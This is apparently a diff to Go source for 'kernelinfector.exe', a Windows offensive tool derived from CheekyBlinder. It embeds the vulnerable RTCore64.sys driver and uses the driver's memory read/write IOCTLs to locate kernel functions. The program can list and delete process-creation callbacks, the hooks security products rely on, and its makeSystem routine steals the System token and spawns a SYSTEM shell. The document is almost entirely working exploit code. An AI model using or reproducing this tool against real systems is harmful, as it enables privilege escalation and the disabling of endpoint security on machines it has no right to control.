@@ -4,13 +4,21 @@ package main
 //go:generate go run $GOROOT/src/syscall/mksyscall_windows.go -output syscallwin.go main.go
 
 import (
+	_ "embed"
 	"fmt"
 	"os"
 	"os/exec"
+	"syscall"
 	"unsafe"
 
-	w32 "github.com/gonutz/w32/v2"
+	"golang.org/x/sys/windows"
 )
+
+//go:embed resources/NtoskrnlOffsets.csv
+var ntoskrnlOffsets string
+
+//go:embed resources/RTCore64.sys
+var binfile []byte
 
 type (
 	DWORD   uint32
@@ -22,12 +30,26 @@ type (
 	HANDLE  uintptr
 	BYTE    byte
 )
+type SECURITY_ATTRIBUTES struct {
+	Length             uint32
+	SecurityDescriptor unsafe.Pointer
+	InheritHandle      uint32 // bool value
+}
 
-//sys EnumDeviceDrivers(lpImageBase uintptr, cb uint32, lpcbNeeded *uint32) (flag bool) = psapi.EnumDeviceDrivers
-//sys LoadLibraryW(lpLibFileName string) (handle uintptr) = kernel32.LoadLibraryW
-//sys GetProcAddress(hModule uintptr,lpProcName string) (address uintptr) = kernel32.GetProcAddress
-//sys FreeLibrary(hLibModule uintptr) (flag bool) = kernel32.FreeLibrary
-//sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (flag bool) = kernel32.DeviceIoControl
+//sys EnumDeviceDrivers(lpImageBase uintptr, cb uint32, lpcbNeeded *uint32) (ret bool) = psapi.EnumDeviceDrivers
+//sys LoadLibraryW(lpLibFileName string) (handle uintptr, err error) = kernel32.LoadLibraryW
+//sys GetProcAddress(hModule uintptr,lpProcName string) (address uintptr, err error) = kernel32.GetProcAddress
+//sys FreeLibrary(hLibModule uintptr) (ret bool) = kernel32.FreeLibrary
+//sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (ret bool) = kernel32.DeviceIoControl
+//sys CreateFile(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, lpSecurityAttributes *SECURITY_ATTRIBUTES, dwCreationDisposition uint32, dwFlagsAndAttributes uint32, hTemplateFile uintptr) (handle uintptr, err error) = kernel32.CreateFile
+//sys CloseHandle(hObject HANDLE) (ret bool) = kernel32.CloseHandle
+//sys RegGetValueW(hkey int,lpSubKey string, lpValue string, dwFlags uint32, pdwType *uint32, pvData uintptr, pcbData *uint32) (ret int,err error) = advapi32.RegGetValueW
+
+//OpenSCManager
+//OpenService
+//CreateService
+//StartService
+//CloseServiceHandle
 
 /*
 from CheekyBlinder
@@ -55,9 +77,10 @@ type Rtcore64MemoryRead struct {
 	Pad3     [16]byte
 }
 
-var (
+const (
 	RTCORE64_MEMORY_READ_CODE  uint32 = 0x80002048
 	RTCORE64_MEMORY_WRITE_CODE uint32 = 0x8000204c
+	INVALID_HANDLE_VALUE       HANDLE = ^HANDLE(0)
 )
 
 /*
@@ -76,8 +99,24 @@ func getVersionOffsets() Offsets {
 	}
 } */
 
+func RegGetString(hKey int, subKey string, value string) string {
+	var ERROR_SUCCESS = 0
+	var RRF_RT_REG_SZ uint32 = 0x00000002
+	var bufLen uint32
+	RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, 0, &bufLen)
+	if bufLen == 0 {
+		return ""
+	}
+	buf := make([]uint16, bufLen)
+	ret, _ := RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, uintptr(unsafe.Pointer(&buf[0])), &bufLen)
+	if ret != ERROR_SUCCESS {
+		return ""
+	}
+	return syscall.UTF16ToString(buf)
+}
+
 func getVersionOffsets() Offsets {
-	winver := w32.RegGetString(w32.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
+	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
 	fmt.Printf("[+] Windows Version %s Found!\n", winver)
 	switch winver {
 	case "1607":
@@ -100,20 +139,19 @@ func getVersionOffsets() Offsets {
 }
 
 func getDriverHandle() HANDLE {
-	device := w32.CreateFile("\\\\.\\RTCore64", w32.GENERIC_READ|w32.GENERIC_WRITE, 0, nil, w32.OPEN_EXISTING, 0, 0)
-	if device == w32.INVALID_HANDLE_VALUE {
+	device, _ := CreateFile("\\\\.\\RTCore64", windows.GENERIC_READ|windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, 0, 0)
+	if HANDLE(device) == INVALID_HANDLE_VALUE {
 		//need error response
 		fmt.Println("[!] Unable to obtain a handle to the device object")
 		return HANDLE(device)
 	} else {
-		fmt.Printf("[+] Device object handle obtained: %p", &device)
+		fmt.Printf("[+] Device object handle obtained: %x", device)
 		return HANDLE(device)
 	}
 }
 
 func findkrnlbase() DWORD64 {
-	var cbNeeded uint32
-	cbNeeded = 0
+	cbNeeded := uint32(0)
 	var drivers [1024]DWORD64
 	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
 		return drivers[0]
@@ -123,8 +161,9 @@ func findkrnlbase() DWORD64 {
 }
 func getFunctionAddress(fnc string) DWORD64 {
 	ntoskrnlbaseaddress := findkrnlbase()
-	ntoskrnl := LoadLibraryW("ntoskrnl.exe")
-	offset := DWORD64(GetProcAddress(uintptr(ntoskrnl), fnc)) - DWORD64(ntoskrnl)
+	ntoskrnl, _ := LoadLibraryW("ntoskrnl.exe")
+	ntoskrnlProcaddress, _ := GetProcAddress(uintptr(ntoskrnl), fnc)
+	offset := DWORD64(ntoskrnlProcaddress) - DWORD64(ntoskrnl)
 	address := ntoskrnlbaseaddress + offset
 	FreeLibrary(ntoskrnl)
 	fmt.Println(address)
@@ -237,7 +276,7 @@ func makeSystem() {
 	fmt.Printf("[*] Current process token: %x\n", currentProcessToken)
 	fmt.Println("[*] Stealing System process token ...")
 	writeMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset, currentProcessTokenReferenceCounter|token)
-	w32.CloseHandle(w32.HANDLE(device))
+	CloseHandle(device)
 
 	fmt.Println("[*] Spawning new shell ...")
 	cmd := exec.Command("c:\\windows\\system32\\cmd.exe")
@@ -249,6 +288,8 @@ func makeSystem() {
 
 func main() {
 	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"
+	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
+	fmt.Printf("[+] Windows Version %s Found!\n", winver)
 
 	if len(os.Args) < 2 {
 		fmt.Println(usage)
